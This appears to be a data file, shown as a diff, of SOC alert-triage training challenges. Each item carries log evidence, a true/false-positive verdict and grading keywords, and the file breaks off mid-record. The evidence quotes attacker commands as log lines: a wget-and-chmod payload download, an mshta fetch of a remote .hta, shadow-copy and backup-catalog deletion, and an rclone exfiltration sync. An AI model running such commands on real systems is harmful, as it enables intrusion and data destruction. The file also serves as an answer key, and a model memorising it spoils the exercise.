@@ -1,0 +1,2017 @@
+[
+ {
+  "id": "ch-01-1",
+  "title": "User-Reported Credential Harvesting Email",
+  "category": "Phishing",
+  "severity": "Medium",
+  "points": 80,
+  "difficulty": "Easy",
+  "verdict": "TP",
+  "description": "A user reported a fake 'mailbox storage full' email. The link leads to a page imitating the corporate Microsoft 365 login. Secure email gateway logs show 3 users clicked it.",
+  "alert": {
+   "rule": "SOC201 - User Reported Phishing Email",
+   "time": "2026-06-02 09:18",
+   "host": "MAIL-GW-01",
+   "user": "p.nowak",
+   "src_ip": "203.0.113.45"
+  },
+  "evidence": [
+   "Subject: 'Action required: mailbox 98% full' from it-support@northwind-helpdesk.example, SPF=fail DKIM=none DMARC=fail",
+   "Link in body: hxxps://northwind-helpdesk.example/owa/login.php?id=8841, domain registered 2 days ago",
+   "Proxy log: 3 internal users (p.nowak, d.osei, m.ricci) requested the URL between 09:02 and 09:11",
+   "Proxy log: POST to /owa/submit.php from d.osei workstation WS-FIN-014 at 09:06, HTTP 200",
+   "Email delivered to 41 mailboxes from sending IP 203.0.113.45"
+  ],
+  "keywords": [
+   "northwind-helpdesk.example",
+   "spf",
+   "dmarc",
+   "credential",
+   "reset",
+   "block",
+   "purge"
+  ]
+ },
+ {
+  "id": "ch-01-2",
+  "title": "Phishing Link Click from Awareness Simulation",
+  "category": "Phishing",
+  "severity": "Low",
+  "points": 80,
+  "difficulty": "Easy",
+  "verdict": "FP",
+  "description": "The email security tool flagged several users clicking a known-bad-looking URL from an external sender. Header and ticket details need checking before escalation.",
+  "alert": {
+   "rule": "SOC204 - Suspicious URL Click Detected",
+   "time": "2026-06-04 13:27",
+   "host": "WS-HR-022",
+   "user": "k.fischer",
+   "src_ip": "10.20.8.62"
+  },
+  "evidence": [
+   "Email from notifications@secure-benefits-portal.example with header X-PhishSim-Campaign: Q2-2026-HR-03",
+   "Sending IP 192.0.2.88 belongs to the contracted awareness training vendor and is on the mail gateway allowlist",
+   "Change ticket CHG-20418 (approved by Security Awareness team) lists campaign Q2-2026-HR-03 running 2026-06-04 to 2026-06-06",
+   "Click event recorded by the training platform for k.fischer at 13:27, no credentials submitted, no file downloaded",
+   "No EDR alerts or unusual process activity on WS-HR-022 after the click"
+  ],
+  "keywords": [
+   "simulation",
+   "x-phishsim-campaign",
+   "chg-20418",
+   "allowlist",
+   "192.0.2.88",
+   "no credentials",
+   "false positive"
+  ]
+ },
+ {
+  "id": "ch-01-3",
+  "title": "Macro-Enabled Invoice Spawns PowerShell",
+  "category": "Phishing",
+  "severity": "High",
+  "points": 120,
+  "difficulty": "Medium",
+  "verdict": "TP",
+  "description": "EDR detected Word launching PowerShell with an encoded command shortly after a user opened an emailed invoice attachment.",
+  "alert": {
+   "rule": "SOC212 - Office Application Spawning Script Interpreter",
+   "time": "2026-06-08 10:14",
+   "host": "WS-ACC-007",
+   "user": "r.alvarez",
+   "src_ip": "10.20.4.37"
+  },
+  "evidence": [
+   "Outlook saved attachment Invoice_88213.docm (SHA256 9f2c4a7b1d8e5f60a3b7c9d2e4f10586b7a9c3d5e7f1029384a6b8c0d2e4f6a8) at 10:12",
+   "Sysmon EventID 1: parent=WINWORD.EXE child=powershell.exe -nop -w hidden -enc SQBFAFgAIAAoA...",
+   "Sysmon EventID 3: powershell.exe connected to 198.51.100.23:443 at 10:14",
+   "Sysmon EventID 11: dropped C:\\Users\\r.alvarez\\AppData\\Roaming\\upd8.dll",
+   "Attachment sender accounts@vendor-billing.example had no prior mail history with the company"
+  ],
+  "keywords": [
+   "docm",
+   "winword.exe",
+   "powershell",
+   "encoded",
+   "198.51.100.23",
+   "isolate",
+   "upd8.dll"
+  ]
+ },
+ {
+  "id": "ch-01-4",
+  "title": "Lookalike Domain Payroll Change Request",
+  "category": "Phishing",
+  "severity": "High",
+  "points": 120,
+  "difficulty": "Medium",
+  "verdict": "TP",
+  "description": "An email impersonating the CFO from a lookalike domain asked payroll to change bank details. The Reply-To address did not match the sender.",
+  "alert": {
+   "rule": "SOC215 - Lookalike Domain Sender Detected",
+   "time": "2026-06-09 15:42",
+   "host": "MAIL-GW-01",
+   "user": "payroll@northwind-corp.example",
+   "src_ip": "203.0.113.120"
+  },
+  "evidence": [
+   "From: 'Helen Brandt (CFO)' <h.brandt@northwlnd-corp.example>, real domain is northwind-corp.example (letter 'i' replaced by 'l')",
+   "Reply-To: h.brandt.office@mailbox-relay.example, which differs from the From address",
+   "Lookalike domain northwlnd-corp.example registered 3 days ago, WHOIS privacy enabled",
+   "Subject: 'Urgent: update my direct deposit before today's run', and the body asks for no phone calls",
+   "payroll@ mailbox replied at 15:49 with the employee bank change form attached"
+  ],
+  "keywords": [
+   "northwlnd-corp.example",
+   "lookalike",
+   "reply-to",
+   "bec",
+   "payroll",
+   "block",
+   "recall"
+  ]
+ },
+ {
+  "id": "ch-01-5",
+  "title": "AiTM Phishing with Session Token Theft and Inbox Rule",
+  "category": "Phishing",
+  "severity": "Critical",
+  "points": 180,
+  "difficulty": "Hard",
+  "verdict": "TP",
+  "description": "A user visited a fake Microsoft sign-in page. Minutes later, a sign-in from a different location succeeded without a new MFA prompt, and a hidden inbox rule was created.",
+  "alert": {
+   "rule": "SOC231 - Suspicious Sign-in After Phishing Click",
+   "time": "2026-06-11 09:21",
+   "host": "AZURE-ENTRA-TENANT",
+   "user": "l.fernandez@northwind-corp.example",
+   "src_ip": "198.51.100.77"
+  },
+  "evidence": [
+   "Defender URL click 09:12: l.fernandez opened hxxps://login-microsoftonline.secure-auth.example/common/oauth2 from a 'Shared document' email",
+   "Entra SignInLogs 09:13: successful sign-in from 10.20.5.34 (corporate), MFA satisfied via authenticator push",
+   "Entra SignInLogs 09:17: successful sign-in from 198.51.100.77 (hosting provider ASN), Linux Chrome UA, MFA satisfied by token claim, no new prompt",
+   "Exchange audit 09:21: New-InboxRule name='.' conditions subject contains 'invoice','payment', action MoveToFolder 'RSS Subscriptions', MarkAsRead=true",
+   "Exchange audit 09:30: 38 emails sent from l.fernandez to external contacts containing the same phishing link",
+   "No impossible-travel block triggered, and no conditional access policy requires compliant devices for Office 365"
+  ],
+  "keywords": [
+   "aitm",
+   "token",
+   "198.51.100.77",
+   "inbox rule",
+   "revoke",
+   "reset",
+   "conditional access"
+  ]
+ },
+ {
+  "id": "ch-02-1",
+  "title": "SSH Brute Force Followed by Root Login on Bastion",
+  "category": "Brute Force",
+  "severity": "High",
+  "points": 80,
+  "difficulty": "Easy",
+  "verdict": "TP",
+  "description": "Linux bastion host logged hundreds of failed SSH password attempts from a single external IP, followed by a successful root login.",
+  "alert": {
+   "rule": "SOC201 - SSH Brute Force Detected",
+   "time": "2026-06-04 03:12",
+   "host": "bastion-lnx-02",
+   "user": "root",
+   "src_ip": "198.51.100.23"
+  },
+  "evidence": [
+   "sshd[18422]: 612 x 'Failed password for root from 198.51.100.23 port 40122 ssh2' between 03:04 and 03:11",
+   "sshd[18977]: 'Accepted password for root from 198.51.100.23 port 40871 ssh2' at 03:12:09",
+   "198.51.100.23 has no prior history in the environment and is not in the admin allowlist",
+   "PermitRootLogin yes and PasswordAuthentication yes are set in /etc/ssh/sshd_config on bastion-lnx-02",
+   "After login, the session ran 'wget http://203.0.113.50/x.sh -O /tmp/x.sh; chmod +x /tmp/x.sh'"
+  ],
+  "keywords": [
+   "failed password",
+   "198.51.100.23",
+   "root",
+   "accepted password",
+   "block",
+   "disable password authentication",
+   "isolate"
+  ]
+ },
+ {
+  "id": "ch-02-2",
+  "title": "Repeated Failed Logons from Backup Server After Password Rotation",
+  "category": "Brute Force",
+  "severity": "Low",
+  "points": 80,
+  "difficulty": "Easy",
+  "verdict": "FP",
+  "description": "A service account triggered a brute force alert with 85 failed logons in 10 minutes, all from one internal server.",
+  "alert": {
+   "rule": "SOC202 - Multiple Failed Logons Single Account",
+   "time": "2026-06-08 01:20",
+   "host": "DC-01",
+   "user": "svc-backup",
+   "src_ip": "10.20.5.14"
+  },
+  "evidence": [
+   "85 x EventID 4625 user=svc-backup src=10.20.5.14 LogonType=4 substatus=0xC000006A (bad password)",
+   "10.20.5.14 resolves to BKP-SRV-03, the corporate backup server (asset inventory: owner IT-Infra)",
+   "Change ticket CHG-20458 shows svc-backup password was rotated at 00:55 by the IT-Infra vault job",
+   "EventID 4740 lockout for svc-backup at 01:09; the Veeam job 'Nightly-FileServers' failed with a credential error at 01:00",
+   "No failed attempts for svc-backup from any other IP, and no successful logon from an unknown source"
+  ],
+  "keywords": [
+   "4625",
+   "4740",
+   "svc-backup",
+   "stale credential",
+   "password rotation",
+   "chg-20458",
+   "false positive"
+  ]
+ },
+ {
+  "id": "ch-02-3",
+  "title": "Password Spray Against Cloud Sign-ins with One Success",
+  "category": "Brute Force",
+  "severity": "High",
+  "points": 120,
+  "difficulty": "Medium",
+  "verdict": "TP",
+  "description": "Identity provider logged one password attempt each against 140 distinct accounts from one IP in 20 minutes, with a single success.",
+  "alert": {
+   "rule": "SOC203 - Password Spray Detected (Cloud IdP)",
+   "time": "2026-06-11 09:47",
+   "host": "AZURE-AD-SIGNIN",
+   "user": "multiple (140 accounts)",
+   "src_ip": "203.0.113.77"
+  },
+  "evidence": [
+   "140 distinct UPNs @contoso-example.com each had 1-2 sign-in failures, ResultType 50126, from 203.0.113.77 between 09:21 and 09:44",
+   "Same user agent on all attempts: python-requests/2.31.0; target app is Exchange Online (legacy IMAP/basic auth)",
+   "j.moreno@contoso-example.com: ResultType 0 (success) at 09:44 from 203.0.113.77 via IMAP, MFA not evaluated",
+   "Conditional Access policy 'Block Legacy Auth' is in report-only mode for this user group",
+   "203.0.113.77 is a known VPS hosting IP that appears in threat intel feeds tagged 'password spraying'"
+  ],
+  "keywords": [
+   "password spray",
+   "50126",
+   "203.0.113.77",
+   "j.moreno",
+   "legacy authentication",
+   "reset password",
+   "revoke sessions"
+  ]
+ },
+ {
+  "id": "ch-02-4",
+  "title": "Failed Logon Burst from Internal Vulnerability Scanner",
+  "category": "Brute Force",
+  "severity": "Medium",
+  "points": 120,
+  "difficulty": "Medium",
+  "verdict": "FP",
+  "description": "Dozens of servers reported failed SMB and RDP logons from one internal IP in a short window, which resembles a brute force sweep.",
+  "alert": {
+   "rule": "SOC204 - Failed Logons Across Multiple Hosts",
+   "time": "2026-06-15 22:08",
+   "host": "multiple (38 servers)",
+   "user": "svc-nessus-scan",
+   "src_ip": "10.50.8.20"
+  },
+  "evidence": [
+   "EventID 4625 user=svc-nessus-scan src=10.50.8.20 on 38 servers, 1-2 failures per host, LogonType=3, over 22:00-22:07",
+   "10.50.8.20 is VULN-SCAN-01, the approved Tenable scanner in the Security subnet",
+   "Change ticket CHG-20611 authorizes a credentialed scan of the server VLAN on 2026-06-15 from 22:00 to 02:00",
+   "Failures occurred only on 38 hosts not yet added to the scanner's credential policy; 214 other hosts show EventID 4624 for the same account",
+   "No attempts on other accounts, no failures after the scan job ended, and no lateral movement from 10.50.8.20"
+  ],
+  "keywords": [
+   "4625",
+   "svc-nessus-scan",
+   "10.50.8.20",
+   "vulnerability scanner",
+   "chg-20611",
+   "credentialed scan",
+   "false positive"
+  ]
+ },
+ {
+  "id": "ch-02-5",
+  "title": "Distributed Credential Stuffing Leading to Mailbox Takeover",
+  "category": "Brute Force",
+  "severity": "Critical",
+  "points": 180,
+  "difficulty": "Hard",
+  "verdict": "TP",
+  "description": "A low-and-slow login campaign from many residential IPs against the remote access portal was followed by an MFA-approved login and suspicious mailbox activity for a finance user.",
+  "alert": {
+   "rule": "SOC205 - Credential Stuffing / Anomalous Success After Failures",
+   "time": "2026-06-22 14:36",
+   "host": "SSLVPN-GW-02",
+   "user": "r.holloway",
+   "src_ip": "192.0.2.144"
+  },
+  "evidence": [
+   "Over 6 hours, 1,900 failed logins for 310 accounts came from 420 distinct IPs (about 4-5 per IP), a pattern consistent with a rotating proxy network",
+   "r.holloway: 3 failures with a previously breached password, then success at 14:31 from 192.0.2.144 (residential ISP, geolocated 9,000 km from the user's usual location)",
+   "MFA: 6 push denials from the real user's phone between 14:24 and 14:30, then 1 push approved at 14:31 (MFA fatigue)",
+   "Exchange audit 14:36: New-InboxRule 'Sync' forwards mail containing 'invoice' or 'wire' to r.holloway.backup@mail-example.net, then the rule is hidden",
+   "EDR on FIN-WS-117 at 14:41: rclone.exe SHA256 3f5a9c1d7e8b24a6c0d9e1f47b82a35c6d1e0f9a4b7c28d3e5f6a1b09c8d7e24 launched from C:\\Users\\Public\\",
+   "User confirms she did not travel and only approved the push to stop the repeated prompts"
+  ],
+  "keywords": [
+   "credential stuffing",
+   "mfa fatigue",
+   "192.0.2.144",
+   "inbox rule",
+   "rclone",
+   "revoke sessions",
+   "isolate"
+  ]
+ },
+ {
+  "id": "ch-03-1",
+  "title": "Office Macro Spawns PowerShell Downloader",
+  "category": "Malware",
+  "severity": "High",
+  "points": 80,
+  "difficulty": "Easy",
+  "verdict": "TP",
+  "description": "EDR flagged WINWORD.EXE spawning PowerShell with an encoded command shortly after a user opened an emailed attachment.",
+  "alert": {
+   "rule": "SOC301 - Suspicious Office Child Process",
+   "time": "2026-06-02 09:14",
+   "host": "WKS-FIN-017",
+   "user": "m.fischer",
+   "src_ip": "10.20.4.57"
+  },
+  "evidence": [
+   "EventID 4688 parent=WINWORD.EXE child=powershell.exe cmdline='powershell -nop -w hidden -enc JABjAGwAaQBlAG4AdAA...'",
+   "Email gateway: attachment Invoice_June_8841.docm delivered 09:11 from billing@acct-payments-secure.example.net (SPF fail)",
+   "Sysmon EventID 3: powershell.exe (PID 6122) connected to 203.0.113.88:443 (update-cdn-check.example.com)",
+   "Sysmon EventID 11: C:\\Users\\m.fischer\\AppData\\Roaming\\svchelper.exe created, SHA256=9f2b7c1e4a6d8305b1c47e92d0a3f5586c1e7ab49d02f3e8a7b5c6d41e0f9a23",
+   "Sysmon EventID 13: Run key HKCU\\...\\Run\\SvcHelper set to svchelper.exe"
+  ],
+  "keywords": [
+   "winword.exe",
+   "powershell",
+   "encoded",
+   "203.0.113.88",
+   "svchelper.exe",
+   "isolate",
+   "persistence"
+  ]
+ },
+ {
+  "id": "ch-03-2",
+  "title": "Antivirus Detection on Pentest Tool in Security Lab",
+  "category": "Malware",
+  "severity": "Medium",
+  "points": 80,
+  "difficulty": "Easy",
+  "verdict": "FP",
+  "description": "AV quarantined a file flagged as a Mimikatz variant on a host in the security team's isolated lab subnet.",
+  "alert": {
+   "rule": "SOC318 - Credential Dumping Tool Detected",
+   "time": "2026-06-04 14:32",
+   "host": "LAB-RT-03",
+   "user": "r.okafor",
+   "src_ip": "192.0.2.43"
+  },
+  "evidence": [
+   "AV detection: HackTool.Mimikatz quarantined at C:\\RedTeam\\tools\\mimi\\mimikatz.exe, SHA256=3c8e1f5a7b20d94e6a1c0b83f7d52e49a6b10c7d8e3f4a529b6d7c0e1f8a4b35",
+   "Host LAB-RT-03 is in asset inventory as 'Red Team Lab - isolated VLAN 99', no production domain trust",
+   "Change ticket CHG-20458 approved 2026-06-01: 'Purple team exercise 06/03-06/05, Mimikatz testing on LAB-RT-03', owner r.okafor",
+   "Firewall: VLAN 99 has no routes to production or internet; no outbound connections from host in the last 24h",
+   "No lateral movement or LSASS access events seen on any production host from this subnet"
+  ],
+  "keywords": [
+   "mimikatz",
+   "lab-rt-03",
+   "chg-20458",
+   "approved",
+   "purple team",
+   "isolated",
+   "false positive"
+  ]
+ },
+ {
+  "id": "ch-03-3",
+  "title": "Ransomware-like Mass File Renames on File Server",
+  "category": "Malware",
+  "severity": "Critical",
+  "points": 120,
+  "difficulty": "Medium",
+  "verdict": "TP",
+  "description": "File integrity monitoring detected thousands of files renamed with a new extension on a shared file server within minutes, plus ransom note creation.",
+  "alert": {
+   "rule": "SOC327 - Mass File Modification / Ransomware Behavior",
+   "time": "2026-06-08 03:07",
+   "host": "FS-SHARE-02",
+   "user": "svc_backup",
+   "src_ip": "10.30.8.112"
+  },
+  "evidence": [
+   "FIM: 14,882 files renamed to *.locked03 in 6 minutes under D:\\Shares\\Finance and D:\\Shares\\HR",
+   "README_RESTORE.txt created in every affected directory with Tor contact instructions",
+   "EventID 4624 LogonType=3 user=svc_backup src=10.30.8.112 (WKS-ENG-044) at 03:01; account normally only logs on from BKP-01",
+   "Sysmon EventID 1 on FS-SHARE-02: vssadmin.exe delete shadows /all /quiet executed at 03:02",
+   "WKS-ENG-044 EDR: unsigned binary C:\\ProgramData\\upd.exe, SHA256=b41d9e07c3a58f1264d0e7a95c3b82f1d6e04a7b9c15f83d2e6a07b4c91d5e68, executed at 02:55"
+  ],
+  "keywords": [
+   "svc_backup",
+   "vssadmin",
+   "shadow",
+   "wks-eng-044",
+   "upd.exe",
+   "isolate",
+   "restore"
+  ]
+ },
+ {
+  "id": "ch-03-4",
+  "title": "Beaconing from Host After Fake Browser Update",
+  "category": "Malware",
+  "severity": "High",
+  "points": 120,
+  "difficulty": "Medium",
+  "verdict": "TP",
+  "description": "NDR flagged highly regular outbound HTTPS connections from a workstation to a newly registered domain following a fake browser update download.",
+  "alert": {
+   "rule": "SOC335 - C2 Beaconing Pattern Detected",
+   "time": "2026-06-10 16:48",
+   "host": "WKS-MKT-029",
+   "user": "l.moretti",
+   "src_ip": "10.20.6.91"
+  },
+  "evidence": [
+   "Proxy: 142 connections in 4h to cdn-sync-assets.example.org (198.51.100.77:443), interval ~60s +/- 3s, avg 480 bytes out / 1.2KB in",
+   "Domain cdn-sync-assets.example.org registered 2026-06-07, WHOIS privacy enabled, no reputation history",
+   "Proxy log 12:21: l.moretti downloaded ChromeUpdate_Setup.exe from chrome-update-now.example.com (blocked category: Newly Registered)",
+   "EDR: ChromeUpdate_Setup.exe SHA256=6e0a2d94b7f13c58a9d1e4f07b63c2a85d90f1e7b4a3c6820d5e9f1b7a4c3d02 unsigned, injected into explorer.exe",
+   "DNS: periodic TXT queries from WKS-MKT-029 to cdn-sync-assets.example.org with long random subdomains"
+  ],
+  "keywords": [
+   "beacon",
+   "198.51.100.77",
+   "cdn-sync-assets.example.org",
+   "chromeupdate_setup.exe",
+   "explorer.exe",
+   "dns",
+   "isolate"
+  ]
+ },
+ {
+  "id": "ch-03-5",
+  "title": "Fileless Loader via WMI Persistence and Signed Binary Proxy",
+  "category": "Malware",
+  "severity": "Critical",
+  "points": 180,
+  "difficulty": "Hard",
+  "verdict": "TP",
+  "description": "Low-signal alerts across a server correlated into a likely fileless malware chain using WMI event subscription, mshta, and in-memory shellcode, with credential access and lateral movement.",
+  "alert": {
+   "rule": "SOC342 - WMI Event Subscription Persistence",
+   "time": "2026-06-15 21:36",
+   "host": "SRV-APP-11",
+   "user": "svc_deploy",
+   "src_ip": "10.40.2.25"
+  },
+  "evidence": [
+   "Sysmon EventID 19/20/21: WMI filter 'WindowsUpdateMon' bound to CommandLineEventConsumer launching mshta.exe http://192.0.2.150/a.hta at 21:34",
+   "Sysmon EventID 10: rundll32.exe (no command-line args, PID 4410) opened lsass.exe with GrantedAccess=0x1010",
+   "Sysmon EventID 8: CreateRemoteThread from mshta.exe into svchost.exe, no file written to disk for payload",
+   "EventID 4648 and 4624 LogonType=3 from SRV-APP-11 to SRV-DB-04 using svc_deploy at 21:41, followed by new WMI subscription on SRV-DB-04",
+   "svc_deploy last password change 412 days ago; account is a local admin on 38 servers",
+   "Threat intel: 192.0.2.150 associated with a known loader family, SHA256 of a.hta=d57c0e91a3b6482f1e90c7d3a5b4f6812e0d9c73a1b58f4e6d2c0a97b3e15f48"
+  ],
+  "keywords": [
+   "wmi",
+   "mshta.exe",
+   "192.0.2.150",
+   "lsass",
+   "svc_deploy",
+   "srv-db-04",
+   "isolate",
+   "reset"
+  ]
+ },
+ {
+  "id": "ch-04-1",
+  "title": "Shadow Copies Wiped on File Server",
+  "category": "Ransomware",
+  "severity": "Critical",
+  "points": 80,
+  "difficulty": "Easy",
+  "verdict": "TP",
+  "description": "EDR flagged vssadmin deleting all shadow copies on a departmental file server, followed by mass file renames. No change ticket exists for this activity.",
+  "alert": {
+   "rule": "SOC401 - Volume Shadow Copy Deletion",
+   "time": "2026-06-04 03:12",
+   "host": "FS-FIN-01",
+   "user": "svc_scan",
+   "src_ip": "10.20.4.15"
+  },
+  "evidence": [
+   "Sysmon EID 1 03:12:07 Image=C:\\Windows\\System32\\vssadmin.exe CommandLine=\"vssadmin delete shadows /all /quiet\" ParentImage=C:\\Users\\Public\\upd.exe User=svc_scan",
+   "Sysmon EID 1 03:12:09 bcdedit /set {default} recoveryenabled No and wbadmin delete catalog -quiet from the same parent",
+   "upd.exe MD5=9f2c4e7a1b3d58e06a7c91d2f4b8e350 first seen on the network 4 minutes earlier, unsigned, created in C:\\Users\\Public",
+   "Sysmon EID 11 03:12-03:19: 18,442 files renamed to *.blackvault in \\\\FS-FIN-01\\Finance$",
+   "README_RESTORE.txt dropped in every directory and demands payment via a .onion address",
+   "Logon from 10.20.4.77 (WS-ACC-14) using svc_scan via SMB at 03:09, the account normally runs only scheduled scans"
+  ],
+  "keywords": [
+   "vssadmin",
+   "shadow copies",
+   "upd.exe",
+   "blackvault",
+   "isolate",
+   "svc_scan",
+   "ransom note"
+  ]
+ },
+ {
+  "id": "ch-04-2",
+  "title": "Shadow Copy Deletion by Backup Job",
+  "category": "Ransomware",
+  "severity": "Medium",
+  "points": 80,
+  "difficulty": "Easy",
+  "verdict": "FP",
+  "description": "A shadow copy deletion alert fired on an application server during the nightly backup window. The parent process needs to be verified.",
+  "alert": {
+   "rule": "SOC402 - Shadow Copy Deletion Detected",
+   "time": "2026-06-05 01:47",
+   "host": "APP-ERP-03",
+   "user": "svc_veeam",
+   "src_ip": "10.30.8.21"
+  },
+  "evidence": [
+   "Sysmon EID 1 01:47:22 Image=C:\\Windows\\System32\\vssadmin.exe CommandLine=\"vssadmin delete shadows /for=D: /oldest\" ParentImage=C:\\Program Files\\Veeam\\Backup and Replication\\VeeamGuestHelper.exe",
+   "Veeam job 'ERP-Nightly' started 01:30 from backup server BKP-01 (10.30.8.21) and finished successfully at 01:52",
+   "VeeamGuestHelper.exe is signed by Veeam Software Group GmbH, and the hash matches the approved software baseline",
+   "Only the oldest snapshot on D: was removed, as part of the standard post-job cleanup. No /all or /quiet flags were used",
+   "No file rename or entropy anomalies on APP-ERP-03 during the window, and no ransom notes or new unsigned binaries were found",
+   "The same alert fired at 01:4x on each of the previous 7 nights on this host"
+  ],
+  "keywords": [
+   "veeam",
+   "vssadmin",
+   "backup window",
+   "signed",
+   "baseline",
+   "false positive",
+   "tune"
+  ]
+ },
+ {
+  "id": "ch-04-3",
+  "title": "PsExec Pushing Unknown Binary to Multiple Servers",
+  "category": "Ransomware",
+  "severity": "Critical",
+  "points": 120,
+  "difficulty": "Medium",
+  "verdict": "TP",
+  "description": "A domain admin account used PsExec to copy and run the same unsigned executable on 14 servers in 3 minutes, shortly after an unusual logon from a workstation.",
+  "alert": {
+   "rule": "SOC418 - Remote Service Execution Across Multiple Hosts",
+   "time": "2026-06-09 22:36",
+   "host": "WS-HR-07",
+   "user": "adm_jlopez",
+   "src_ip": "10.40.12.63"
+  },
+  "evidence": [
+   "EID 4624 22:31 user=adm_jlopez LogonType=3 src=10.40.12.63 on DC-02. adm_jlopez has never logged in from WS-HR-07 before",
+   "EID 7045 on 14 servers 22:33-22:36: new service PSEXESVC, then service 'WinSvcUpdate' with ImagePath=C:\\Windows\\ADMIN$\\svchelp.exe",
+   "svchelp.exe MD5=c41e0b7d92aa3f6e58d1b07e6f93a2d4, unsigned, 0 prior prevalence, VT detections on 41 of 70 engines (Hive-like family)",
+   "WS-HR-07 EDR: Cobalt Strike beacon injected into explorer.exe at 22:14, C2 callback to 198.51.100.48:443",
+   "Sysmon EID 11 on SRV-SQL-02: 3,100 files renamed to *.hvlock within 90 seconds of svchelp.exe starting",
+   "EID 1102 Security log cleared on SRV-SQL-02 and SRV-APP-05 at 22:38"
+  ],
+  "keywords": [
+   "psexec",
+   "7045",
+   "svchelp.exe",
+   "adm_jlopez",
+   "198.51.100.48",
+   "cobalt strike",
+   "isolate",
+   "reset"
+  ]
+ },
+ {
+  "id": "ch-04-4",
+  "title": "Mass File Encryption from Security Test Host",
+  "category": "Ransomware",
+  "severity": "High",
+  "points": 120,
+  "difficulty": "Medium",
+  "verdict": "FP",
+  "description": "The EDR raised a ransomware behavior alert on a Windows workstation with rapid file modifications and high entropy writes. Check whether this is part of an authorized exercise.",
+  "alert": {
+   "rule": "SOC425 - Ransomware Behavior: Rapid High-Entropy File Writes",
+   "time": "2026-06-11 14:08",
+   "host": "WS-SEC-LAB-02",
+   "user": "p.nguyen",
+   "src_ip": "10.99.5.12"
+  },
+  "evidence": [
+   "EDR: RanSim.exe (KnowBe4 Ransomware Simulator) modified 2,000 files in C:\\RanSimFiles and renamed them to *.encrypted in 40 seconds",
+   "Host WS-SEC-LAB-02 is tagged 'Purple-Team-Lab' in the CMDB and sits in VLAN 99, which is isolated from production shares",
+   "Change ticket CHG0048213 approved by SOC manager for 2026-06-11 14:00-16:00 covering ransomware simulation by p.nguyen (Security Engineering)",
+   "RanSim.exe hash 5d1a8f03b6c7e2194a0fd83c7be16a92 matches the vendor-published hash, signed by KnowBe4, Inc.",
+   "No shadow copy deletion, no outbound traffic to external IPs, no SMB writes to production file servers during the window",
+   "No ransom note outside C:\\RanSimFiles; the simulation test folder was restored by the tool at 14:15"
+  ],
+  "keywords": [
+   "ransim",
+   "chg0048213",
+   "purple team",
+   "authorized",
+   "vlan 99",
+   "signed",
+   "close"
+  ]
+ },
+ {
+  "id": "ch-04-5",
+  "title": "Double Extortion: Exfiltration Before Encryption",
+  "category": "Ransomware",
+  "severity": "Critical",
+  "points": 180,
+  "difficulty": "Hard",
+  "verdict": "TP",
+  "description": "A large outbound transfer alert from an engineering file server linked to multiple earlier low-severity alerts for the same service account. The pattern is consistent with pre-ransomware staging and data theft.",
+  "alert": {
+   "rule": "SOC447 - Abnormal Outbound Data Volume to Rare Destination",
+   "time": "2026-06-17 04:22",
+   "host": "FS-ENG-02",
+   "user": "svc_backup",
+   "src_ip": "10.50.3.30"
+  },
+  "evidence": [
+   "Firewall: 10.50.3.30 -> 203.0.113.77:443 (files-sync.example.net) 48.3 GB out between 02:10 and 04:20. The destination was first seen on 2026-06-16 and has no business justification",
+   "Sysmon EID 1: C:\\ProgramData\\svchost_update.exe (MD5=7b3e90c1d4a2f8650e9c13ab5d7f2e81, original filename rclone.exe) CommandLine=\"sync \\\\FS-ENG-02\\CAD :webdav: --transfers 16\" User=svc_backup",
+   "EID 4769 on DC-01 on 2026-06-16 21:55: 37 TGS requests with RC4 encryption (0x17) from WS-ENG-11 for SPN accounts, consistent with Kerberoasting. svc_backup password hash cracked offline",
+   "EID 4728 on 2026-06-17 01:40: svc_backup added to Domain Admins by adm_jlopez from WS-ENG-11. EID 5136 shows a new GPO 'Update-Policy' linked to the root domain",
+   "EID 4624 LogonType=10 on BKP-01 at 03:58 from FS-ENG-02. Veeam configuration database exported, wbadmin delete catalog executed at 04:05",
+   "GPO scheduled task set to run \\\\DC-01\\SYSVOL\\corp.example\\scripts\\enc.exe at the next 05:00 Group Policy refresh, not yet executed on most hosts"
+  ],
+  "keywords": [
+   "rclone",
+   "exfiltration",
+   "203.0.113.77",
+   "kerberoasting",
+   "4728",
+   "gpo",
+   "svc_backup",
+   "isolate",
+   "disable gpo"
+  ]
+ },
+ {
+  "id": "ch-05-1",
+  "title": "PsExec Service Install on File Server from Workstation",
+  "category": "Lateral Movement",
+  "severity": "High",
+  "points": 80,
+  "difficulty": "Easy",
+  "verdict": "TP",
+  "description": "EDR and Windows logs show a remote service named PSEXESVC installed on a file server from a user workstation outside any change window, followed by execution of a renamed binary.",
+  "alert": {
+   "rule": "SOC201 - Remote Service Creation via PsExec",
+   "time": "2026-06-04 14:12",
+   "host": "FS-FINANCE-02",
+   "user": "CORP\\j.marlowe",
+   "src_ip": "10.20.14.77"
+  },
+  "evidence": [
+   "EventID 7045 host=FS-FINANCE-02 ServiceName=PSEXESVC ImagePath=%SystemRoot%\\PSEXESVC.exe at 14:12:03",
+   "EventID 4624 host=FS-FINANCE-02 user=CORP\\j.marlowe LogonType=3 src=10.20.14.77 at 14:12:01",
+   "Sysmon EventID 1 on FS-FINANCE-02: ParentImage=PSEXESVC.exe Image=C:\\Windows\\Temp\\upd.exe SHA256=9f2c4b7a1de05c83b6a4f1e2d7c90ab35e8f1d6c42b7a09e5d3c18f6a2b4e7d0",
+   "Source workstation WKS-HR-114 belongs to HR; j.marlowe is an HR coordinator with no admin role",
+   "No approved change ticket or IT admin activity for FS-FINANCE-02 on 2026-06-04"
+  ],
+  "keywords": [
+   "psexec",
+   "7045",
+   "4624",
+   "10.20.14.77",
+   "isolate",
+   "reset",
+   "upd.exe"
+  ]
+ },
+ {
+  "id": "ch-05-2",
+  "title": "RDP Burst from Jump Host During Patch Window",
+  "category": "Lateral Movement",
+  "severity": "Low",
+  "points": 80,
+  "difficulty": "Easy",
+  "verdict": "FP",
+  "description": "Detection fired on one account making RDP connections to 12 servers in 30 minutes. The source is the documented admin jump host and the activity matches an approved patch change.",
+  "alert": {
+   "rule": "SOC207 - Anomalous Multi-Host RDP Activity",
+   "time": "2026-06-06 22:18",
+   "host": "JUMP-ADM-01",
+   "user": "CORP\\svc-patchadm",
+   "src_ip": "10.10.5.20"
+  },
+  "evidence": [
+   "12 x EventID 4624 LogonType=10 user=CORP\\svc-patchadm src=10.10.5.20 between 22:00 and 22:30",
+   "10.10.5.20 is JUMP-ADM-01, listed in the CMDB as the privileged access jump host",
+   "Change ticket CHG-48213 approved: monthly Windows patching 2026-06-06 21:30-23:59 covering the same 12 servers",
+   "svc-patchadm authenticated via MFA-enforced PAM checkout (session ID PAM-77301) before each connection",
